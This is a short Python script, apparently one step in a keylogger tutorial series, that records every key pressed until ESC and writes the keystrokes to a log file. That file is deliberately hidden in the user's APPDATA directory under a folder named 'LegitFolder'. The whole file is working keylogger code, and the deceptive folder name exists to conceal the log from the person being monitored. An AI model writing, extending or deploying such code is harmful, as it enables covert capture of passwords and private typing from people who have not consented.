# Iteration 3: Hides the log file in App Data folder

import keyboard
import os

directory = os.path.join(os.getenv("APPDATA"), "LegitFolder")

# Make the specified directory. If it doesn't exist, 
try:
    os.mkdir(directory)
except FileExistsError:
    pass

# Name of the log file
log_path = os.path.join(directory, "text.txt")

# Log keystrokes into specified pathname
with open(log_path, "w") as f:
    print('Starting record! Press ESC to exit!')
    events = keyboard.record(until='escape')
    
    for event in events:
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            f.write(f"{key}")